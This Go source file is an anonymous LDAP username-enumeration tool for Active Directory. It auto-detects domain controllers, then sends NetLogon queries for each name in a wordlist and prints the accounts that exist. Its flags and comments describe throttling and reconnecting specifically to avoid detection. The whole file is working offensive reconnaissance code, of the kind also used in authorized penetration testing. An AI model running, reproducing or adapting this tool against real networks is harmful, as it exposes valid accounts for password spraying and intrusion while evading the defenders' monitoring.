package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/Showmax/go-fqdn"
	"github.com/lkarlslund/ldap/v3"
	"github.com/schollz/progressbar/v3"
)

//go:generate go run github.com/dmarkham/enumer -output enums_generated.go -type TLSmode enums.go

type TLSmode byte

const (
	TLS      TLSmode = 0
	StartTLS TLSmode = 1
	NoTLS    TLSmode = 2
)

type NetLogonExResponse struct {
	OpCode     uint16
	Sbz        uint16
	Flags      uint32
	DomainGUID [16]byte
}

func main() {
	server := flag.String("server", "", "Comma separated list of DCs to connect to, use IP or full hostname - will try autodection if not supplied")
	dnsdomain := flag.String("dnsdomain", "", "Domain to connect to in DNS suffix format - will try autodection if not supplied")
	port := flag.Int("port", 389, "LDAP port to connect to (389 or 636 typical)")
	tlsmodeString := flag.String("tlsmode", "NoTLS", "Transport mode (TLS, StartTLS, NoTLS)")
	ignoreCert := flag.Bool("ignorecert", true, "Disable certificate checks")

	inputname := flag.String("input", "", "File to read usernames from, uses stdin if not supplied")
	outputname := flag.String("output", "", "File to write detected usernames to, uses stdout if not supplied")

	// evasive maneuvers
	throttle := flag.Int("throttle", 0, "Only do a request every N ms, 0 to disable")
	maxrequests := flag.Int("maxrequests", 0, "Disconnect and reconnect a connection after n requests, 0 to disable")

	maxservers := flag.Int("maxservers", 8, "Maximum amount of servers to run in parallel")
	maxstrategy := flag.String("maxstrategy", "fastest", "How to select servers if more are found than wanted (fastest, random)")
	parallel := flag.Int("parallel", 8, "How many connections per server to run in parallel")

	log.Println("LDAP Nom Nom - anonymously bruteforce your way to Active Directory usernames")

	flag.Parse()

	tlsmode, err := TLSmodeString(*tlsmodeString)
	if err != nil {
		log.Fatalf("unknown TLS mode %v", tlsmode)
	}

	output := os.Stdout
	if *outputname != "" {
		output, err = os.Create(*outputname)
		if err != nil {
			log.Fatalf("Could not create %v: %v", *outputname, err)
		}
	}
	defer output.Close()

	var pb *progressbar.ProgressBar
	input := os.Stdin
	var pbmax int
	if *inputname != "" {
		input, err = os.Open(*inputname)
		if err != nil {
			log.Fatalf("Can't open %v: %v", *inputname, err)
		}
		defer input.Close()

		if *outputname != "" {
			// Count lines
			linescanner := bufio.NewScanner(input)
			linescanner.Split(bufio.ScanLines)
			var lines int
			for linescanner.Scan() {
				lines++
			}
			input.Seek(0, os.SEEK_SET)
			pbmax = lines
		}
	}

	names := bufio.NewScanner(input)
	names.Split(bufio.ScanLines)

	var servers []string
	if *server != "" {
		servers = strings.Split(*server, ",")
	}

	// AUTODETECTION
	if len(servers) == 0 {
		// We only need to auto-detect the domain if the server is not supplied
		if *dnsdomain == "" {
			log.Println("No server supplied, auto-detecting")
			*dnsdomain = strings.ToLower(os.Getenv("USERDNSDOMAIN"))
			if *dnsdomain == "" {
				// That didn't work, lets try something else
				f, err := fqdn.FqdnHostname()
				if err == nil && strings.Contains(f, ".") {
					log.Print("No USERDNSDOMAIN set - using machines FQDN as basis")
					*dnsdomain = strings.ToLower(f[strings.Index(f, ".")+1:])
				}
			}
		}
		if *dnsdomain == "" {
			log.Fatal("Domain auto-detection failed")
		} else {
			log.Printf("Auto-detected DNS domain as %v", *dnsdomain)
			// Auto-detect server
			cname, dservers, err := net.LookupSRV("", "", "_ldap._tcp.dc._msdcs."+*dnsdomain)
			if err == nil && cname != "" && len(dservers) != 0 {
				detectedServers := make([]string, len(dservers))
				for i, ds := range dservers {
					detectedServers[i] = strings.TrimRight(ds.Target, ".")
				}

				log.Printf("Detected %v Domain Controllers for %v", detectedServers, *dnsdomain)
				if len(detectedServers) == 1 {
					log.Printf("Only one Domain Controller found, using %v", detectedServers[0])
					servers = []string{detectedServers[0]}
				} else if len(detectedServers) <= *maxservers {
					// Just add all of them
					servers = detectedServers
					log.Printf("Using %v as target servers", strings.Join(servers, ", "))
				} else {
					log.Printf("Using strategy %v to select %v target servers from %v", *maxstrategy, *maxservers, strings.Join(detectedServers, ", "))
					switch strings.ToLower(*maxstrategy) {
					case "fastest":
						// Find the best performing servers
						var benchWG sync.WaitGroup
						var benchLock sync.Mutex
						type benchResult struct {
							server     string
							iterations int
						}
						var benchResults []benchResult

						benchWG.Add(len(detectedServers))
						for _, serverToBench := range detectedServers {
							go func(server string) {
								starttime := time.Now()
								var conn *ldap.Conn
								var err error
								switch tlsmode {
								case NoTLS:
									conn, err = ldap.Dial("tcp", fmt.Sprintf("%s:%d", server, *port))
								case StartTLS:
									conn, err = ldap.Dial("tcp", fmt.Sprintf("%s:%d", server, *port))
									if err == nil {
										err = conn.StartTLS(&tls.Config{ServerName: server})
									}
								case TLS:
									config := &tls.Config{
										ServerName:         server,
										InsecureSkipVerify: *ignoreCert,
									}
									conn, err = ldap.DialTLS("tcp", fmt.Sprintf("%s:%d", server, *port), config)
								}

								if err != nil {
									log.Printf("Problem connecting to %v: %v", server, err)
									benchWG.Done()
									return
								}

								var iterations int
								for time.Since(starttime) < time.Second*2 {
									// NetLogon lookup without username
									request := ldap.NewSearchRequest("",
										ldap.ScopeBaseObject, ldap.NeverDerefAliases, 0, 0, false,
										"(&(NtVer=\x06\x00\x00\x00)(AAC=\x10\x00\x00\x00))", // The filter to apply
										[]string{"NetLogon"}, // A list attributes to retrieve
										nil,
									)
									_, err := conn.Search(request)
									if err != nil {
										log.Printf("failed to execute search request: %v", err)
										benchWG.Done()
										return
									}
									iterations++
								}
								benchLock.Lock()
								benchResults = append(benchResults, benchResult{
									server:     server,
									iterations: iterations,
								})
								benchLock.Unlock()
								benchWG.Done()
							}(serverToBench)
						}
						benchWG.Wait()

						sort.Slice(benchResults, func(i, j int) bool {
							return benchResults[i].iterations > benchResults[j].iterations
						})
						for i := 0; i < *maxservers && i < len(benchResults); i++ {
							servers = append(servers, benchResults[i].server)
						}
					case "random":
						for i := 0; i < *maxservers; i++ {
							serverindex := rand.Intn(len(detectedServers))
							if detectedServers[serverindex] != "" {
								servers = append(servers, detectedServers[serverindex])
								detectedServers[serverindex] = "" // don't reuse it
							}
						}
					default:
						log.Fatalf("Unknown strategy %v", *maxstrategy)
					}
				}
			}
			if len(servers) > 0 {
				log.Printf("Using these servers: %v", strings.Join(servers, ", "))
			} else {
				log.Fatal("AD controller auto-detection failed, use '--server' parameter")
			}
		}
	}
	// END OF AUTODETECTION

	if len(servers) == 0 {
		log.Fatal("missing AD controller server name - please provide this on commandline")
	}

	inputqueue := make(chan string, 128)
	outputqueue := make(chan string, 128)

	var connectMutex sync.Mutex
	var connectError error

	var jobs sync.WaitGroup

	var throttleTimer *time.Ticker
	if *throttle > 0 {
		throttleTimer = time.NewTicker(time.Millisecond * time.Duration(*throttle))
	}

	jobs.Add(*parallel * len(servers))
	for _, server := range servers {
		for i := 0; i < *parallel; i++ {
			go func(server string) {
				var requests int
			reconnectLoop:
				for {
					connectMutex.Lock()
					if connectError != nil {
						connectMutex.Unlock()
						jobs.Done()
						return
					}

					var conn *ldap.Conn
					switch tlsmode {
					case NoTLS:
						conn, err = ldap.Dial("tcp", fmt.Sprintf("%s:%d", server, *port))
					case StartTLS:
						conn, err = ldap.Dial("tcp", fmt.Sprintf("%s:%d", server, *port))
						if err == nil {
							err = conn.StartTLS(&tls.Config{ServerName: server})
						}
					case TLS:
						config := &tls.Config{
							ServerName:         server,
							InsecureSkipVerify: *ignoreCert,
						}
						conn, err = ldap.DialTLS("tcp", fmt.Sprintf("%s:%d", server, *port), config)
					}

					if err != nil {
						log.Printf("Problem connecting to LDAP %v server: %v", server, err)
						connectError = err
						jobs.Done()
						connectMutex.Unlock()
						return
					}

					connectMutex.Unlock()

					for username := range inputqueue {
						// do throttling if needed
						if throttleTimer != nil {
							<-throttleTimer.C
						}

						request := ldap.NewSearchRequest(
							"", // The base dn to search
							ldap.ScopeBaseObject, ldap.NeverDerefAliases, 0, 0, false,
							fmt.Sprintf("(&(NtVer=\x06\x00\x00\x00)(AAC=\x10\x00\x00\x00)(User="+username+"))"), // The filter to apply
							[]string{"NetLogon"}, // A list attributes to retrieve
							nil,
						)
						response, err := conn.Search(request)
						if err != nil {
							if v, ok := err.(*ldap.Error); ok && v.ResultCode == 201 {
								continue
							}
							log.Printf("failed to execute search request: %v", err)
							continue
						}

						// Did we catch something?
						res := response.Entries[0].Attributes[0].ByteValues[0]
						if len(res) > 2 && res[0] == 0x17 && res[1] == 00 {
							outputqueue <- username
						}

						// Should we start a new connection to avoid detection
						requests++
						if *maxrequests != 0 && requests == *maxrequests {
							requests = 0
							conn.Close()
							continue reconnectLoop
						}
					}
					// No more input in channel, bye bye from this worker
					break
				}

				jobs.Done()
			}(server)
		}
	}

	go func() {
		for username := range outputqueue {
			fmt.Fprintln(output, username)
		}
	}()

	if pbmax != 0 {
		pb = progressbar.NewOptions(pbmax,
			progressbar.OptionSetDescription("Progress"),
			progressbar.OptionShowIts(),
		)
	}

	go func() {
		var line int
		for names.Scan() {
			if pb != nil && line%500 == 0 {
				pb.Set(line)
			}

			username := names.Text()
			if username != "" {
				if strings.ContainsAny(username, `"/\:;|=,+*?<>`) {
					continue
				}
				inputqueue <- username
			}
			line++
		}
		close(inputqueue)
	}()

	jobs.Wait()
	close(outputqueue)
}
